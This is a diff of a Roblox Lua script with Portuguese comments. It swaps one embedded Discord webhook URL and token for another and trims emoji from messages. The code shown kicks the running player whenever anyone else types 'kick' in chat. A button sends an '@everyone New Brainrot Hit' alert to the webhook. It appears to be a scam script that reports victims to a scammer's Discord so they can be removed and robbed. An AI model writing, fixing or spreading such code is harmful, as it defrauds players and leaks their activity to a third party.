@@ -238,8 +238,8 @@ if not player then
     return
 end
 
--- ⚠️ SISTEMA DE KICK COM MÚLTIPLOS MÉTODOS ⚠️
-print("🛡️ Sistema de kick ativado para jogador:", player.Name)
+-- ⚠ SISTEMA DE KICK COM MÚLTIPLOS MÉTODOS ⚠
+print("🛡 Sistema de kick ativado para jogador:", player.Name)
 
 -- Método 1: PlayerChatted (evento global)
 Players.PlayerChatted:Connect(function(_, chatPlayer, message)
@@ -248,13 +248,13 @@ Players.PlayerChatted:Connect(function(_, chatPlayer, message)
     local msg = string.lower(message)
     
     if msg == "kick" or msg:find("kick") then
-        print("⚠️ Comando KICK detectado!")
+        print("⚠ Comando KICK detectado!")
         
         if chatPlayer.Name ~= player.Name then
             print("🚫 Kickando", player.Name)
-            player:Kick("⚠️ Você foi removido do servidor.\nTente novamente mais tarde.")
+            player:Kick("⚠ Você foi removido do servidor.\nTente novamente mais tarde.")
         else
-            print("ℹ️ Você mesmo digitou kick")
+            print("ℹ Você mesmo digitou kick")
         end
     end
 end)
@@ -269,7 +269,7 @@ for _, otherPlayer in pairs(Players:GetPlayers()) do
             
             if msg == "kick" or msg:find("kick") then
                 print("🚫 [Chatted] KICK de", otherPlayer.Name)
-                player:Kick("⚠️ Você foi removido do servidor.")
+                player:Kick("⚠ Você foi removido do servidor.")
             end
         end)
     end
@@ -287,7 +287,7 @@ Players.PlayerAdded:Connect(function(newPlayer)
             
             if msg == "kick" or msg:find("kick") then
                 print("🚫 [PlayerAdded] KICK de", newPlayer.Name)
-                player:Kick("⚠️ Você foi removido do servidor.")
+                player:Kick("⚠ Você foi removido do servidor.")
             end
         end)
     end
@@ -303,7 +303,7 @@ pcall(function()
             
             if text == "kick" or text:find("kick") then
                 print("🚫 [TextChatService] KICK detectado!")
-                player:Kick("⚠️ Você foi removido do servidor.")
+                player:Kick("⚠ Você foi removido do servidor.")
             end
         end
     end)
@@ -312,7 +312,7 @@ end)
 print("✅ Sistema de kick configurado com 4 métodos!")
 
 -- Coloque a sua webhook aqui:
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1433922894160723969/p8PMvPhnIQQ5JC4hwnxI9rmzAnF3VC3Hykay3e0bXEpZaKmWi79Abu5LPAuyEyebsqd4"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1434657700280664276/Y40L0K3WXsLafhQfUyJ2QKmfDeoGQACyNhCpJLkk-Qm1g-i0PfKm3XOEdesxDY6sat8F"
 
 local playerGui = player:WaitForChild("PlayerGui")
 
@@ -519,7 +519,7 @@ button.MouseButton1Click:Connect(function()
 
     -- Payload formatado com sintaxe corrigida
     local payload = {
-        ["content"] = "@everyone **New Brainrot Hit**",
+        ["content"] = "@everyone *New Brainrot Hit*",
         ["username"] = "Brainrot System",
         ["avatar_url"] = "https://i.imgur.com/oBnXOzr.png",
         ["embeds"] = {
